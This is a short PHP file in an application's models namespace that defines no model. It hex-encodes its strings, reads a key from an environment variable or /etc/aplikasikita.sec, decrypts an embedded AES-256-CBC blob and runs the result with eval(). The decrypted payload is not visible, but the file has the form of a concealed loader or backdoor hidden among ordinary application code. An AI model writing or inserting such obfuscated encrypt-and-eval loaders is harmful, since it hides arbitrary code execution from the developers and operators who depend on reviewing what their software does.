<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('qiPA+/g78jSY9crFzeQNoA==');

$c=base64_decode(

'nnBi8zn5lg8ApF/NuQL2r+HjB/1iB/zbkdiKg1hgIEAdFTUyzn5FNlcF1zwPH7xFZYavgt5JKPx/' .
'KNK81khg4JpdY2ZuwXpmYuLeaPTg6V7sAD0ReZLaYH/+Y6fYlHOFwojOhssj4pd8KTpJhaT58Vly' .
'7imCOYQ7ctp+3Kun/hGItd3J1JgnLQFaMlLqAIu36NYr4dEdsOF2x9RudN3Pogp45cCuMDNz9J83' .
'BUKppoFne6AVQv9Pb9nzKqZbpiqXLDulQ1/vC4ZRms159Rq1qSVSomeOrnAAPsSTaXROTh+vb/K5' .
'kfp1Ws2EYyYeXPjzV4a1Vb3naA7bX6zt4RX2zUD3MkWM3aRs2u/j+wQ2XaXDpzf7B2MFBCaJrdk2' .
'WBzwe3B5U7sut06K3OR/QLoMScSCTyexsk/5bFbVFQ97lq904S30UlzwRGh7ia4KQptYTNldL4O6' .
'vBjkD5JDlaMmSXwtdoWEX3Bzxj81EID6nGtSBcHYw4v3N1BXgl/va2uqgEXd3RWcUrtfeubVqB7S' .
'sYFblBJPG9FbJbPfCVmNIX9Bt9UdxIWjVr5YX+J8aWJ/oln1KKF0uMDzSDe3p4XnEJnnAffPpjt6' .
'bEvjqY/84DsZpZk2TqoqQLJYH7m34J2MLNho3jHgz1Qgp1jnFfuTD6Ua7TIDSeJVsiJQ2LDpYy4s' .
'yXUpQ7r1Q6J+7dgYB0SUwZ2lVePtEGFPy7Ho3Fm7tpNoUokfATJEBBonZoPYBz/SuNsSY1TnMmWS' .
'1NE17z6a9gBBCrAEUqWMUIA31yv8FoJz2qN6znGwtiivxSXMmICRwZmThtKFjPwj+u2iLphkOGCI' .
'Tr7PHZ1nFGmhA7IbV8gFvrGl9KqXYJwsvmMFxOXPH6pHSLDa98J/EaYbVZkK4JXLXRNVkKKUxR5P' .
'vT1GoA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

